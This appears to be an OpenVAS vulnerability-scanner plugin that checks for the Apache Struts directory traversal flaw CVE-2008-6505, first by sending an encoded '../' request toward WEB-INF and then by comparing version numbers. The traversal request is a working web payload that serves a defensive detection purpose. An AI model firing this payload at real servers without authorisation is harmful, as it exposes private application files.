###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_dir_traversal_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Apache Struts Directory Traversal Vulnerability
#
# Authors:
# Sujit Ghosal <sghosal@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the attacker launch directory traversal
  attack and gain sensitive information about the remote system directory
  contents.
  Impact Level: System/Application";
tag_affected = "Apache Struts version 2.0.x and prior to 2.0.12
  Apache Struts version 2.1.x and prior to 2.1.3";
tag_insight = "Input validation error within the user supplied request URI while read
  arbitrary files via '../' with a '/struts/' path which is related to
  FilterDispatcher and DefaultStaticContentLoader.";
tag_solution = "Upgrade to Apache Struts version 2.0.12, 2.1.3 or later.
  http://struts.apache.org/download.cgi";
tag_summary = "This host is running Apache Struts and is prone to Directory Traversal
  Vulnerability.";

if(description)
{
  script_id(800271);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-04-23 08:16:04 +0200 (Thu, 23 Apr 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-6505");
  script_bugtraq_id(32104);
  script_name("Apache Struts Directory Traversal Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/32497");
  script_xref(name : "URL" , value : "http://struts.apache.org/2.x/docs/s2-004.html");
  script_xref(name : "URL" , value : "http://issues.apache.org/struts/browse/WW-2779");

  script_description(desc);
  script_summary("Check for Apache Struts Version and Attack");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_detect.nasl");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

strutsPort = get_http_port(default:8080);
if(!strutsPort){
  exit(0);
}

if(!safe_checks())
{
  foreach dir (make_list("/", "/struts-blank", cgi_dirs()))
  {
    # Try out the attack string here
    soc = open_sock_tcp(strutsPort);
    if(soc) {
      attack = string("GET ", dir + "/struts/..%252f..%252f..%252fWEB-INF \r\n",
                      "Host: ", get_host_name(), "\r\n\r\n");
      send(socket:soc, data:attack);
      atkRes = recv(socket:soc, length:30720);
      close(soc);
      
      if("classes" >< atkRes && "lib" >< atkRes && "src" >< atkRes)
      {
        security_warning(strutsPort);
        exit(0);
      }
    } 
  }
}

strutsVer = get_kb_item("www/" + strutsPort + "/Apache/Struts");
strutsVer = eregmatch(pattern:"^(.+) under (/.*)$", string:strutsVer);
if(!strutsVer[1]){
  exit(0);
}

if(version_in_range(version:strutsVer[1], test_version:"2.0", test_version2:"2.0.11") ||
   version_in_range(version:strutsVer[1], test_version:"2.1", test_version2:"2.1.2")){
  security_warning(strutsPort);
}
